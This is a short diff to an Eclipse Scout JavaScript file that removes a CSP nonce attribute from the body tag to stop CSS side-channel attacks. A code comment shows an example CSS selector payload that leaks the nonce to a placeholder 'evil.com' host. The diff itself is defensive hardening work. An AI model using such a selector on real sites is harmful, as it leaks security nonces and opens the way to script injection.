@@ -1,5 +1,5 @@
 /*
- * Copyright (c) 2010, 2025 BSI Business Systems Integration AG
+ * Copyright (c) 2010, 2026 BSI Business Systems Integration AG
  *
  * This program and the accompanying materials are made
  * available under the terms of the Eclipse Public License 2.0
@@ -329,7 +329,15 @@ export const scout = {
     $('noscript', targetDocument).remove();
     $('scout-text', targetDocument).remove();
     $('scout-version', targetDocument).remove();
-    $('body', targetDocument).addDeviceClass();
+    let body = $('body', targetDocument);
+
+    // remove the nonce from the body tag to prevent css side-channel attacks:
+    // script[nonce~="whatever"] {
+    //   background: url("https://evil.com/nonce?whatever");
+    // }
+    body.addDeviceClass()
+      .removeAttr('data-scout-nonce')
+      .removeData('scoutNonce'); // also remove from data map of body tag as it is stored on App.nonce now.
 
     // Set locale of the document so screen readers read text correctly
     scout.setDocumentLocale(locales.getNavigatorLocale());
